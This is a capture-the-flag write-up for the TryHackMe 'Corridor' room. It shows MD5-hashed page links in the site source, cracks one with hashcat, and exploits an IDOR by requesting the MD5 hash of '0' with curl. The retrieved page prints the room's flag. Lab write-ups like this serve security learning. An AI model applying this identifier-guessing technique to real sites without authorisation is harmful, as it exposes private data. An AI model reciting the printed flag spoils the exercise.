# Corridor Write-up

<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/04afd126bf7a729eec5ff41e5b9b1212.png" width="200" height="200">

Difficulty: Easy

room link: https://tryhackme.com/room/corridor

--------------------------------------------------------------------------------------------------------------------------------

Given a web-site, where we see this main page 

![image](https://github.com/zer00d4y/writeups/assets/128820441/faa857c3-684d-4fcf-bbb2-068332483a66)

If we try to click on the door, we'll be taken to a page with an empty room.

![image](https://github.com/zer00d4y/writeups/assets/128820441/8022f5db-c036-435d-a342-065347ecd56c)

In the source code we can see the link of the doors 

    ...
                <area target="" alt="c4ca4238a0b923820dcc509a6f75849b" title="c4ca4238a0b923820dcc509a6f75849b" href="c4ca4238a0b923820dcc509a6f75849b" coords="257,893,258,332,325,351,325,860" shape="poly">
                <area target="" alt="c81e728d9d4c2f636f067f89cc14862c" title="c81e728d9d4c2f636f067f89cc14862c" href="c81e728d9d4c2f636f067f89cc14862c" coords="469,766,503,747,501,405,474,394" shape="poly">
                <area target="" alt="eccbc87e4b5ce2fe28308fd9f2a7baf3" title="eccbc87e4b5ce2fe28308fd9f2a7baf3" href="eccbc87e4b5ce2fe28308fd9f2a7baf3" coords="585,698,598,691,593,429,584,421" shape="poly">
                <area target="" alt="a87ff679a2f3e71d9181a67b7542122c" title="a87ff679a2f3e71d9181a67b7542122c" href="a87ff679a2f3e71d9181a67b7542122c" coords="650,658,644,437,658,652,655,437" shape="poly">
                <area target="" alt="e4da3b7fbbce2345d7772b0674a318d5" title="e4da3b7fbbce2345d7772b0674a318d5" href="e4da3b7fbbce2345d7772b0674a318d5" coords="692,637,690,455,695,628,695,467" shape="poly">
                <area target="" alt="1679091c5a880faf6fb5e6087eb1b2dc" title="1679091c5a880faf6fb5e6087eb1b2dc" href="1679091c5a880faf6fb5e6087eb1b2dc" coords="719,620,719,458,728,471,728,609" shape="poly">
                <area target="" alt="8f14e45fceea167a5a36dedd4bea2543" title="8f14e45fceea167a5a36dedd4bea2543" href="8f14e45fceea167a5a36dedd4bea2543" coords="857,612,933,610,936,456,852,455" shape="poly">
                <area target="" alt="c9f0f895fb98ab9159f51fd0297e236d" title="c9f0f895fb98ab9159f51fd0297e236d" href="c9f0f895fb98ab9159f51fd0297e236d" coords="1475,857,1473,354,1537,335,1541,901" shape="poly">
                <area target="" alt="45c48cce2e2d7fbdea1afc51c7c6ad26" title="45c48cce2e2d7fbdea1afc51c7c6ad26" href="45c48cce2e2d7fbdea1afc51c7c6ad26" coords="1324,766,1300,752,1303,401,1325,397" shape="poly">
                <area target="" alt="d3d9446802a44259755d38e6d163e820" title="d3d9446802a44259755d38e6d163e820" href="d3d9446802a44259755d38e6d163e820" coords="1202,695,1217,704,1222,423,1203,423" shape="poly">
                <area target="" alt="6512bd43d9caa6e02c990b0a82652dca" title="6512bd43d9caa6e02c990b0a82652dca" href="6512bd43d9caa6e02c990b0a82652dca" coords="1154,668,1146,661,1144,442,1157,442" shape="poly">
                <area target="" alt="c20ad4d76fe97759aa27a0c99bff6710" title="c20ad4d76fe97759aa27a0c99bff6710" href="c20ad4d76fe97759aa27a0c99bff6710" coords="1105,628,1116,633,1113,447,1102,447" shape="poly">
                <area target="" alt="c51ce410c124a10e0db5e4b97fc2af39" title="c51ce410c124a10e0db5e4b97fc2af39" href="c51ce410c124a10e0db5e4b97fc2af39" coords="1073,609,1081,620,1082,459,1073,463" shape="poly">
    ...

Pay attention to the link of each page it looks like a hash, let's decrypt it with hashcat 

### Hashcat 

`hashcat -a 0 -m 0 hash wordlist`

    ┌──(kali㉿kali)-[~/wordlist]
    └─$ hashcat -a 0 -m 0 hash.txt rockyou.txt        
    
    Dictionary cache hit:
    * Filename..: rockyou.txt
    * Passwords.: 14344384
    * Bytes.....: 139921497
    * Keyspace..: 14344384
    
    8f14e45fceea167a5a36dedd4bea2543:7                        
                                                              
    Session..........: hashcat
    Status...........: Cracked
    Hash.Mode........: 0 (MD5)
    Hash.Target......: 8f14e45fceea167a5a36dedd4bea2543
    Time.Started.....: Thu Feb 15 03:01:17 2024 (2 secs)
    Time.Estimated...: Thu Feb 15 03:01:19 2024 (0 secs)
    Kernel.Feature...: Pure Kernel
    Guess.Base.......: File (rockyou.txt)
    Guess.Queue......: 1/1 (100.00%)
    Speed.#1.........:   739.0 kH/s (0.33ms) @ Accel:256 Loops:1 Thr:1 Vec:8
    Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
    Progress.........: 442368/14344384 (3.08%)
    Rejected.........: 0/442368 (0.00%)
    Restore.Point....: 440832/14344384 (3.07%)
    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
    Candidate.Engine.: Device Generator
    Candidates.#1....: 940706 -> 55555c
    Hardware.Mon.#1..: Util: 28%

Now, we know it's an md5 hash.

There is a simple IDOR vulnerability where for directories are encoded into an md5 hash 

corridor.thm/8f14e45fceea167a5a36dedd4bea2543 => corridor.thm/7

Using echo or another tool or an online MD5 decoder, we need to encode the 0 into an MD5 hash

    ┌──(kali㉿kali)-[~]
    └─$ echo -n "0" | md5sum
    cfcd208495d565ef66e7dff9f98764da

Wisit page with cURL 

`curl http://corridor.thm/cfcd208495d565ef66e7dff9f98764da`

    ┌──(kali㉿kali)-[~]
    └─$ curl http://corridor.thm/cfcd208495d565ef66e7dff9f98764da                  
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
            integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
        <title>Corridor</title>
    
        <link rel="stylesheet" href="/static/css/main.css">
    </head>
    
    <body>
        
    
    <style>
        body{
            background-image: url("/static/img/empty_room.png");
            background-size:  cover;
        }
    
        h1 {
            width: 100%;
            position: absolute;
            top: 40%;
            text-align: center;
        }
    </style>
    <h1>
        flag{2477ef02448ad9156661ac40a6b8862e}
    </h1>
    
    </body>
    </html>

So, flag is: 

    flag{2477ef02448ad9156661ac40a6b8862e}


                                        
